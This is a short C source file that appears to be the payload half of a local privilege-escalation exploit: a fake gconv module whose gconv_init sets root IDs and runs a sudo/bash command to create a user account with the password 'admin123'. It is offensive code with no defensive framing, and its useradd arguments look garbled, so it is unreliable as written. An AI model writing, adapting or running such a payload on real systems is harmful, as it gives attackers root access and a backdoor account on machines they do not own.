//
// Created by Tahaa on 20/12/2022.
//
#include <stdio.h>
#include <stdlib.h>

void gconv() {}

void gconv_init() {
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    system("/usr/bin/sudo -u root bash -c 'useradd -m root -s /bin/bash -p $(echo admin123 | openssl passwd -stdin -1) dbusu'");
    exit(0);
}